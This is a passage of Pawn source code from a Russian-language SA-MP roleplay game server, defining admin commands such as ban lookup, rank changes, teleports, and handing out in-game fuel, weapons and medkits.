	if(sscanf(params, "sii", params[0], params[1], params[2]))
	{
		SCM(playerid, -1, " Введите: /anim [библиотека] [номер анимации] [повторять]");
	}
	return true;
}
CMD:sort(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1) return true;
	if(sscanf(params, "sii", params[0], params[1], params[2]))
	{
		SCM(playerid, -1, " Введите: /sort [Ключ] [Сортировка = 1] [Размер = 30]");
		SCM(playerid, -1, "   [Ключ] Доступные ключи: RPR, TAXILVL, MONEY, BANK, BUS");
		SCM(playerid, -1, "   [Сортировка<Не обязательный>] Доступные значения <По убыванию: 1> или <По возрастанию: 0>. <По умолчанию: 1>");
		SCM(playerid, -1, "   [Размер<Не обязательный>] Количество строк в списке: от 1 до 50. <По умолчанию: 30>");
	}
	return true;
}
CMD:bantime(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5) return true;
	new params_name[24];
	if(sscanf(params, "s[24]", params_name)) return SCM(playerid, -1, " Введите: /bantime [name]");
	mysql_format(DATABASE,QUERY,256,"SELECT * FROM `"TABLE_BAN"` WHERE `Name` = '%s'",params_name);
	new Cache:result = mysql_query(DATABASE, QUERY);
	if(cache_num_rows())
	{
		new ban = cache_get_field_content_int(0,"Unban");
		new ddate = cache_get_field_content_int(0,"Date");
		new nameadmin[32], banreason[32];
		cache_get_field_content(0,"NameAdmin", nameadmin);
		cache_get_field_content(0,"Reason", banreason);
		new year, month, day,hour,minute,second;
		new byear, bmonth, bday,bhour,bminute,bsecond;
		TimestampToDates(ban, year, month, day, hour, minute, second, 0);
		TimestampToDates(ddate, byear, bmonth, bday, bhour, bminute, bsecond, 0);
		format(YCMDstr, sizeof(YCMDstr), "{D95A41}Этот аккаунт заблокирован\nЗабанил: %s\nПричина: %s\nДата бана: %i/%02i/%02i %02i:%02i:%02i\nДата разбана: %i/%02i/%02i %02i:%02i:%02i\n\nВведите \"/q\" чтобы выйти\n",nameadmin, banreason, byear,bmonth,bday,bhour,bminute,bsecond, year,month,day,hour,minute,second);
		ShowPlayerDialogEx(playerid,78,0,"{c22000}Внимание",YCMDstr,"Закрыть","");
	}
	else SCM(playerid, COLOR_GREY, " Аккаунт не в бане");
	return cache_delete(result, DATABASE);
}
//#7
CMD:giverank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0 || !GetPVarInt(playerid,"Fraction_Duty")) return true;
	new para1;
	new level;
	new giveplayer[MAX_PLAYER_NAME];
	new sendername[MAX_PLAYER_NAME];
	if(!CanGiveRanker(playerid)) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
	if(sscanf(params, "ud",para1,level)) return SCM(playerid, -1, " Введите: /giverank [id игрока] [ранг]");
	if(!CanGiveRank(playerid, para1, level)) return false;

	if(para1 == playerid) { SCM(playerid, COLOR_GREY, " Вы указали свой ID"); return true; }
	if(PTEMP[para1][pLeader] >= 1) { SCM(playerid, COLOR_GREY, " Вы указали ID лидера"); return true; }
	GetPlayerName(para1, giveplayer, sizeof(giveplayer));
	GetPlayerName(playerid, sendername, sizeof(sendername));
	PTEMP[para1][pRank] = level;
	format(string, 128, " %s повысил/понизил вас до %i ранга ",sendername, level);
	SCM(para1, COLOR_BLUE, string);
	format(string, 128, " Вы повысили/понизили %s до %i ранга.", giveplayer,level);
	SCM(playerid, COLOR_BLUE, string);
	if(GetPVarInt(para1, "Fraction_Duty"))
	{
		switch(PTEMP[playerid][pMember])
		{
		    case 1, 3, 10, 19, 21: Update3DTextLabelText(LabelRank[para1], TEAM_GROVE_COLOR, GetRank(para1));
		}
	}
	return true;
}
CMD:agiverank(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return SCM(playerid, -1, " Введите: /agiverank [playerid] [ранг от 1 до 7]");
	if(params[1] > 7 || params[1] < 0) { SCM(playerid, COLOR_GREY, " Не мене 0 и не более 7!"); return true; }
	if(!IsPlayerConnected(params[0])) return true;
	PTEMP[params[0]][pRank] = params[1];
	format(string, 128, " %s повысил/понизил вас до %i ранга", Name(playerid), params[1]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вы повысили/понизили %s до %i ранга.",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	return true;
}
CMD:teleport(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	new x_tp;
	if(sscanf(params, "d", x_tp))
	{
		ShowPlayerDialogEx(playerid, 10093, DIALOG_STYLE_LIST, "Телепорт", "[0] Основное", "Выбрать", "Назад");
		SCM(playerid, -1, " Введите: /tp [ключ]");
		return true;
	}
	new Float:tpx, Float:tpy, Float:tpz, tpvw, tpint, Float:ptpx, Float:ptpy, Float:ptpz;
	switch(x_tp)
	{
	    case 1:
		{
			ptpx = 1134.9340, ptpy = -1755.3342, ptpz = 13.2847;
			tpx = 1575.0957, tpy = -1694.8140, tpz = 6.2188;
			tpint = 0; tpvw = 0;
		}
	    case 2:
		{
			ptpx = 978.7877, ptpy = 30.9696, ptpz = 1001.1465;
			tpx = 268.3361,tpy = 81.3648,tpz = 1001.0391;
            tpint = 6, tpint = 30;
		}
	    case 3:
	    {
			ptpx = -2026.0707, ptpy = 179.2475, ptpz = 28.8359;
			tpx = 1478.7388,tpy = -1740.8102,tpz = 13.5469;
            tpint = 0, tpint = 0;
		}
	    case 4:
		{
			ptpx = 1797.3173, ptpy = 839.3347, ptpz = 10.6719;
			tpx = 1135.7295,tpy = -1756.0243,tpz = 13.5811;
            tpint = 0, tpint = 0;
		}
	    case 5:
		{
			ptpx = -2442.0095, ptpy = 522.6154, ptpz = 29.6196;
			tpx = -110.4161,tpy = -1140.6246,tpz = 1.6458;
            tpint = 0, tpint =0;
		}
	    case 6:
		{
			ptpx = 2182.6470, ptpy = -2276.5984, ptpz = 13.5337;
			tpx = -2032.9954,tpy = -84.5489,tpz = 35.8284;
            tpint = 0, tpint = 0;
		}
	    case 7:
		{
			ptpx = 2201.7083, ptpy = -1697.3547, ptpz = 13.6818;
			tpx = -2441.6545,tpy = 521.0729,tpz = 29.9168;
            tpint = 0, tpint = 0;
		}
	    case 8:
		{
			ptpx = -2042.7015, ptpy = -92.3698, ptpz = 35.1718;
			tpx = -1543.5612,tpy = -427.5089,tpz = 5.8583;
            tpint = 0, tpint = 0;
		}
	    case 9:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 1472.8420,tpy = -2481.2085,tpz = 13.5547;
            tpint = 0, tpint = 0;
		}
		case 10:
		{
		    ptpx = 1249.2120, ptpy = -1819.5248, ptpz = 13.4101;
			tpx = 212.3810,tpy = 1916.1110,tpz = 17.6406;
            tpint = 0, tpint = 0;
		}
	    case 11:
		{
			ptpx = 1483.4178, ptpy = -1743.8053, ptpz = 13.5469;
			tpx = 1797.0323, tpy = 865.5620,tpz = 11.3155;
            tpint = 0, tpint = 0;
		}
		case 12:
		{
		    ptpx = 1417.4324, ptpy = 1703.7415, ptpz = 13.2478;
			tpx = -2608.2639, tpy = 1400.1230,tpz = 7.1323;
            tpint = 0, tpint = 0;
		}
		case 13:
		{
			ptpx = 82.1025, ptpy = 1920.3364, ptpz = 17.6807;
			tpx = 1973.7936, tpy = 1039.2103, tpz = 994.4688;
            tpint = 10, tpint = 0;
		}
  		case 14:
		{
			ptpx = 1672.6022, ptpy = 2262.3828, ptpz = 10.8203;
			tpx = 2830.4048, tpy = 1312.9185, tpz = 10.7729;
            tpint = 0, tpint = 0;
		}
		case 15:
		{
		    ptpx = 1359.0708, ptpy = -1278.9153, ptpz = 13.3582;
			tpx = 1961.2422, tpy = -2181.9412, tpz = 13.5469;
            tpint = 0, tpint = 0;
		}
	    case 16:
		{
		    ptpx = -1336.3948, ptpy = 466.9529, ptpz = 7.1875;
			tpx = -1968.9689, tpy = 156.4293, tpz = 27.6875;
            tpint = 0, tpint = 0;
		}
	    case 17:
		{
      		ptpx = -1357.4685, ptpy = 434.1743, ptpz = 7.1875;
			tpx = -1357.4685, tpy = 434.1743, tpz = 7.1875;
            tpint = 0, tpint = 0;
		}
		case 18:
		{
		    ptpx = -1269.6945, ptpy = 502.9579, ptpz = 18.2294;
			tpx = -1269.6945, tpy = 502.9579, tpz = 18.2294;
            tpint = 0, tpint = 0;
		}
		case 19:
		{
		    ptpx = 1959.5488, ptpy = -2180.7593, ptpz = 13.5469;
			tpx = 321.2846, tpy = 1934.9167, tpz = 17.6406;
            tpint = 0, tpint = 0;
		}
		case 20:
		{
		    ptpx = 2424.8781, ptpy = -769.1270, ptpz = 1421.9255;
			tpx = 91.6006, tpy = 1182.4490, tpz = 21.1174;
            tpint = 0, tpint = 0;
		}
		case 21:
		{
		    ptpx = 1450.6117, ptpy = -2467.6792, ptpz = 13.5547;
			tpx = 2196.3066, tpy = -1682.1842, tpz = 14.0373;
            tpint = 0, tpint = 0;
		}
		case 22:
		{
		    ptpx = 2483.7451, ptpy = 2773.3271, ptpz = 10.4680;
			tpx = 197.1036, tpy = 158.6299, tpz = 1003.0234;
            tpint = 3, tpint = 30;
		}
		case 23:
		{
			ptpx = 2695.5076, ptpy = -1704.6638, ptpz = 11.8438;
			tpx = 217.7062, tpy = 121.7604, tpz = 999.0156;
            tpint = 10, tpint = 30;
		}
		case 24:
		{
		    ptpx = 2197.4595, ptpy = -2252.8787, ptpz = 13.5469;
			tpx = 2197.4595, tpy = -2252.8787, tpz = 13.5469;
            tpint = 0, tpint = 0;
		}
		case 25:
		{
		    ptpx = -769.78, ptpy = 495.13, ptpz = 1376.56;
			tpx = -769.78, tpy = 495.13, tpz = 1376.56;
            tpint = 1, tpint = 10;
		}
		case 26:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 2031.4806, tpy = 1014.9394, tpz = 10.8203;
            tpint = 0, tpint = 0;
		}
		case 27:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 2150.9121, tpy = 1675.8231, tpz = 10.8203;
            tpint = 0, tpint = 0;
		}
		case 28:
		{
		    ptpx = -1077.7568, ptpy = -2305.7173, ptpz = 52.3192;
			tpx = 1779.5966, tpy = -1908.7085, tpz = 13.3890;
            tpint = 0, tpint = 0;
		}
		default: tpx = 0.0;
	}
	if(tpx != 0.0)
	{
		if(GetPlayerState(playerid) == 2)
		{
			new tmpcar = GetPlayerVehicleID(playerid);
			SetVehiclePos(tmpcar, tpx,tpy,tpz);
			PTEMP[ playerid ][ pPos_x ] = ptpx;
			PTEMP[ playerid ][ pPos_y ] = ptpy;
			PTEMP[ playerid ][ pPos_z ] = ptpz;
			SetPVarInt(playerid, "AntiBreik", 2);
			TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
		}
		else
		{
			SetPlayerPos(playerid, tpx,tpy,tpz);
		}
		SCM(playerid, COLOR_YELLOW, " Вы телепортированы");
		SetPlayerInterior(playerid,tpint);
		SetPlayerVirtualWorld(playerid,tpvw);
		return true;
	}
	ShowPlayerDialogEx(playerid, 10093, DIALOG_STYLE_LIST, "Телепорт", "[0] Основное", "Выбрать", "Назад");
	return true;
}
CMD:ajob(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	ShowPlayerDialogEx(playerid, 10092, DIALOG_STYLE_MSGBOX, "Приём на работу", "Вы хотите просмотреть список доступных работ?", "Да", "Нет");
	return true;
}
CMD:mark(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
	SCM(playerid, -1, " Точка телепорта установлена");
	return true;
}
CMD:gotomark(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePos(tmpcar, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
		SetPVarInt(playerid, "AntiBreik", 2);
		PTEMP[ playerid ][ pPos_x ] = TeleportDest[playerid][0];
		PTEMP[ playerid ][ pPos_y ] = TeleportDest[playerid][1];
		PTEMP[ playerid ][ pPos_z ] = TeleportDest[playerid][2];
		SetPVarInt(playerid, "AntiBreik", 2);
		TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
	}
	else SetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
	SCM(playerid, -1, " Вы были телепортированы");
	SetPlayerInterior(playerid,0);
	return true;
}
CMD:agoto(playerid)
{
	if(PTEMP[playerid][pAdmin] < 10) return true;
	if(!Goto[playerid])
	{
		Goto[playerid] = true;
		SCM(playerid, COLOR_GREEN, " Вы разрешили телепорт к вам.");
	}
	else
	{
		Goto[playerid] = false;
		SCM(playerid, COLOR_RED, " Вы запретили телепорт к вам.");
	}
	return true;
}
CMD:goto(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /goto [playerid]");
	new Float:plocx,Float:plocy,Float:plocz;
	if(!IsPlayerConnected(params[0])) return true;
	if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, " Игрок оффлайн / не залогинен");
	if((GetPlayerState(params[0]) == PLAYER_STATE_SPECTATING && gSpectateID[params[0]] != INVALID_PLAYER_ID) || (GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && gSpectateID[playerid] != INVALID_PLAYER_ID)) return SCM(playerid, COLOR_GRAD1, " Кто-то из вас в режиме наблюдения (/recon)");
	if(Goto[params[0]] == false && PTEMP[playerid][pAdmin] < 10) return SCM(playerid, COLOR_GREY, " В данный момент к нему телепортироваться нельзя!");
	GetPlayerPos(params[0], plocx, plocy, plocz);
	if (GetPlayerState(playerid) == 2)
	{
		new tmpcar = GetPlayerVehicleID(playerid);
		SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
		SetPVarInt(playerid, "AntiBreik", 2);
		PTEMP[ playerid ][ pPos_x ] = plocx;
		PTEMP[ playerid ][ pPos_y ] = plocy+4;
		PTEMP[ playerid ][ pPos_z ] = plocz;
		SetPVarInt(playerid, "AntiBreik", 2);
		TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
	}
	else
	{
		SetPlayerPos(playerid,plocx,plocy+2, plocz);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]));
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]));
	}
	SCM(playerid, -1, " Вы были телепортированы");
	return true;
}
CMD:gethome(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 5 || dostup[playerid] == 0 || PTEMP[playerid][pMember] == 2 && PTEMP[playerid][pRank] > 3) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /gethome [id]");
	foreach(i)
	{
		if(HGet(i) && PTEMP[i][pPHouseKey] == i)
		{
			format(YCMDstr,sizeof(YCMDstr)," Home: [%i], Player: [%i]",params[0],i);
			SCM(playerid,COLOR_GREY,YCMDstr);
		}
	}
	return true;
}
CMD:get(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	new param[40];
	if( sscanf( params, "s[32]S()[64]", param, params ) )
	{
		SCM(playerid, 0xffffffaa, "================ Get ================");
		SCM(playerid, 0xffffffaa, " Введите: /get [name]");
		SCM(playerid, 0xafafafaa, " Доступные названия: Drugs, Fuel, Guns, Medkit");
		SCM(playerid, 0x33aa33ff, "=====================================");
		return true;
	}
	if(strcmp(param, "fuel",true) == 0)
	{
		for(new b = 1; b <= TotalBizz; b++)
		{
			if(PlayerToPoint(10.0, playerid, BizzInfo[b][bEntranceX], BizzInfo[b][bEntranceY], BizzInfo[b][bEntranceZ]) && BizzInfo[b][bType] == 4)
			{
				if(BizzInfo[b][bProducts] <= 0 && strcmp(BizzInfo[b][bOwner],"None",true) != 0) return SCM(playerid,COLOR_GRAD1,"Заправка не работает");
				if(BizzInfo[b][bLocked] == 1) return SCM(playerid,COLOR_GRAD1, "Заправка закрыта!");
				if(PTEMP[playerid][pFuel] != 0) return SCM(playerid, COLOR_GRAD1, "У вас уже есть канистра");
				if(PTEMP[playerid][pCash] < BizzInfo[b][bPrice]) return SCM(playerid,COLOR_GRAD1, "Не достаточно денег!");
				BizzInfo[b][bTill] += BizzInfo[b][bPrice]/4;
				BizzPay[b] += BizzInfo[b][bPrice]/4;
				PTEMP[playerid][pCash] -= BizzInfo[b][bPrice]/4;
				if(strcmp(BizzInfo[b][bOwner],"None",true) != 0) BizzInfo[b][bProducts] -= 20;
				format(string, 128, "Вы купили 20 литров бензина за %i вирт",BizzInfo[b][bPrice]/4);
				SCM(playerid, 0x6495EDFF, string);
				PTEMP[playerid][pFuel] = 1;
				PTEMP[playerid][pCash] -= BizzInfo[b][bPrice]/4;
				return true;
			}
		}
	}
	else if(strcmp(param, "drugs",true) == 0)
	{
		if(!IsAGang(playerid)) return SCM(playerid,COLOR_GRAD1, " Вы не бандит!");
		new ammo;
		if(sscanf( params, "d", ammo ) ) return SCM(playerid, -1, " Введите: /get drugs [количество]");
		if(!PlayerToPoint(3.0,playerid,322.1280,1118.8314,1083.8828)) return SCM(playerid, COLOR_GRAD1, " Вы не в притоне!");
		if(PTEMP[playerid][pCash] < ammo*20) return SCM(playerid,COLOR_GRAD1, " У вас недостаточно денег");
		if(PTEMP[playerid][pDrugs]+ammo >= 151) { SCM(playerid, COLOR_GREY, " Нельзя купить больше"); return true; }
		if(ammo > 150 || ammo < 1) { SCM(playerid, COLOR_GREY, " Нельзя меньше 1 или больше 150!"); return true; }
		PTEMP[playerid][pCash] -= ammo*20;
		PTEMP[playerid][pDrugs] += ammo;
		format(string, 128, " Вы купили %i грамм наркотиков за %i вирт (У вас есть %i грамм)", ammo, ammo*20, PTEMP[playerid][pDrugs]);
		SCM(playerid, 0x6495EDFF, string);
	}
	else if(strcmp(param,"guns",true) == 0)
	{
		if(IsAGang(playerid))
		{
			new numberof;
			if(sscanf( params, "d", numberof ) ) return SCM(playerid, COLOR_GRAD2, " Введите: /get guns [кол-во]");
			if(PTEMP[playerid][pRank] < 4) return SCM(playerid,COLOR_GREY," Функция доступна с 4 ранга");
			if(!IsATerra(playerid)) return SCM(playerid, COLOR_GRAD1, " Вы не на своей базе");
			if((PTEMP[playerid][pMats] + numberof) > 500) return SCM(playerid, COLOR_GRAD1," Нельзя взять больше");
			if(numberof < 1 || numberof > 500) return SCM(playerid, COLOR_GREY, " Вы не можете взять меньше 1 и больше 500 материалов");
			if(IsAGang(playerid) && PTEMP[playerid][pRank] >= 4)
			{
				if(PTEMP[playerid][pMember] == 12)
				{
					if(wareBallasLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(ballasmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					ballasmatbi -= numberof;
				}
				else if(PTEMP[playerid][pMember] == 13)
				{
				    if(wareVagosLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(vagosmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					vagosmatbi -= numberof;
				}
				else if(PTEMP[playerid][pMember] == 15)
				{
				    if(wareGrooveLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(groovmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					groovmatbi -= numberof;
				}
				else if(PTEMP[playerid][pMember] == 17)
				{
				    if(wareAztecLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(aztekmatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					aztekmatbi -= numberof;
				}
				else if(PTEMP[playerid][pMember] == 18)
				{
				    if(wareRifaLock) return SCM(playerid, COLOR_GREY, " Склад закрыт");
					if(rifamatbi <= numberof) return SCM(playerid, COLOR_GREY, " На складе нет материалов");
					rifamatbi -= numberof;
				}
				PTEMP[playerid][pMats] += numberof;
				format(string, 128, " У вас %i/500 материалов с собой", PTEMP[playerid][pMats]);
				SCM(playerid, -1, string);
				format(YCMDstr, sizeof(YCMDstr), " %s взял материалы со склада", Name(playerid));
				ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
		}
	}
	else if(strcmp(param,"medkit",true) == 0)
	{
		if((!IsAGang(playerid) && !IsAMafia(playerid)) || PTEMP[playerid][pRank] < 9) return SCM(playerid,COLOR_GREY," Вам недоступна данная команда");
		if(!PlayerToPoint(30, playerid,372.0985,-53.2946,1076.4708))
		{
			new _null;
			switch(PTEMP[playerid][pMember])
			{
			case 12: _null = ballashel; case 13: _null = vagoshel; case 15: _null = groovhel;
			case 17: _null = aztekhel; case 18: _null = rifahel; case 6: _null = yakuzahel;
			case 5: _null = lcnhel; case 14: _null = rmhel;
			}
			return SendMes(playerid,0x6495EDFF," На складе организации %i аптечек",_null);
		}
		new null;
		if(sscanf(params, "i",null) || null < 1 || null > 5000) return SCM(playerid, -1, " Введите: /get medkit [колличество] (стоимость 1 аптечки - 4 вирт)");
		switch(PTEMP[playerid][pMember])
		{
		case 12:
			{
				if(ballashel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fBallas] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				ballashel+=null;
				FracBank[0][fBallas]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fBallas]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 13:
			{
				if(vagoshel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fVagos] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				vagoshel+=null;
				FracBank[0][fVagos]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fVagos]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 15:
			{
				if(groovhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fGrove] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				groovhel+=null;
				FracBank[0][fGrove]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fGrove]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 17:
			{
				if(aztekhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fAztek] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				aztekhel+=null;
				FracBank[0][fAztek]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fAztek]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 18:
			{
				if(rifahel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(FracBank[0][fRifa] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				rifahel+=null;
				FracBank[0][fRifa]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,FracBank[0][fRifa]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 6:
			{
				if(yakuzahel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(MafiaBank[0][nYakuza] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				yakuzahel+=null;
				MafiaBank[0][nYakuza]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,MafiaBank[0][nYakuza]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 5:
			{
				if(lcnhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(MafiaBank[0][nLcn] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				lcnhel+=null;
				MafiaBank[0][nLcn]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,MafiaBank[0][nLcn]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		case 14:
			{
				if(rmhel+null > 5000) return SCM(playerid,COLOR_GREY," Неверное колличество! (Максимум 5000)");
				if(MafiaBank[0][nRm] < null*4) return SCM(playerid,COLOR_GREY," Недостаточно средств в банке организации!");
				rmhel+=null;
				MafiaBank[0][nRm]-=null*4;
				SendMes(playerid,COLOR_YELLOW," Вы купили %i аптечек. Остаток в банке организации: %i вирт!",null,MafiaBank[0][nRm]);
				format(YCMDstr,15,"~r~$-%i",null*4);
				GameTextForPlayer(playerid,YCMDstr, 5000, 1);
			}
		}
	}
	return true;
}
CMD:fillcar(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GREY," У вас нет машины!");
	new car = GetPlayerVehicleID(playerid);
	if(PTEMP[playerid][pFuel] != 1) return SCM(playerid, COLOR_GREY, " У вас нет канистры");
	if(!IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(car) == 481 || GetVehicleModel(car) == 509 || GetVehicleModel(car) == 510) return SCM(playerid,COLOR_YELLOW, " Вы не в автомобиле/Этот транспорт нельзя заправить");
	SCM(playerid, 0x6495EDFF, " Вы дозаправили свой автомобиль 20 литрами бензина");
	Fuell[car] += 20;
	PTEMP[playerid][pFuel] = 0;
	return true;
}
CMD:gethere(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	new plo;
	if(sscanf(params, "u",plo)) return SCM(playerid, -1, " Введите: /gethere [playerid]");
	if(PTEMP[plo][pAdmin] >= 10 && PTEMP[playerid][pAdmin] < 10) return SCM(playerid, COLOR_GREY, " Вы не можете телепортировать его!");
	new Float:plocx,Float:plocy,Float:plocz;
	new inter = GetPlayerInterior(playerid);
	new worldd = GetPlayerVirtualWorld(playerid);
	if(IsPlayerConnected(plo))
	{
		if(plo != INVALID_PLAYER_ID)
		{
			if(PTEMP[playerid][pAdmin] >= 3)
			{
				if(GetPlayerState(plo) != 1 && GetPlayerState(plo) != 2 && GetPlayerState(plo) != 3) return	SCM(playerid, COLOR_GRAD1, " Игрок оффлайн / не залогинен");
			//	if(GetPVarInt(plo, "AFK_Time") > 2 && PTEMP[plo][pAdmin] <= 0) return SCM(playerid, COLOR_GREY, " Данный игрок AFK");
				GetPlayerPos(playerid, plocx, plocy, plocz);
				SetPlayerInterior(plo,inter);
				SetPlayerVirtualWorld(plo,worldd);
				if (GetPlayerState(plo) == 2)
				{
					TelePos[plo][0] = 0.0;
					TelePos[plo][1] = 0.0;
					SetPlayerInterior(plo,inter);
					new tmpcar = GetPlayerVehicleID(plo);
					SetPlayerVirtualWorld(plo,worldd);
					SetVehiclePos(tmpcar, plocx, plocy+4, plocz);
					SetPVarInt(plo, "AntiBreik", 2);
					PTEMP[ plo ][ pPos_x ] = plocx;
					PTEMP[ plo ][ pPos_y ] = plocy+4;
					PTEMP[ plo ][ pPos_z ] = plocz;
					SetPVarInt(plo, "AntiBreik", 2);
				}
				else
				{
					SetPlayerPos(plo,plocx,plocy+2, plocz);
					SetPlayerInterior(plo,inter);
					SetPlayerVirtualWorld(plo,worldd);
				}
				SCM(plo, -1, " Вас телепортировал к себе администратор "NameServer"");
			}
		}
	}
	return true;
}
CMD:g(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "dd",params[0])) return GiveWeapon(playerid,24,120);
	if(params[0] != 23 && params[0] != 24 && params[0] != 25 && params[0] != 29 && params[0] != 33 && params[0] != 31) return SCM(playerid, COLOR_GREY, " Доступно только оружие: 23, 24, 25, 29, 33, 31");
	GiveWeapon(playerid,params[0],120);
	return true;
}
CMD:givegun(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
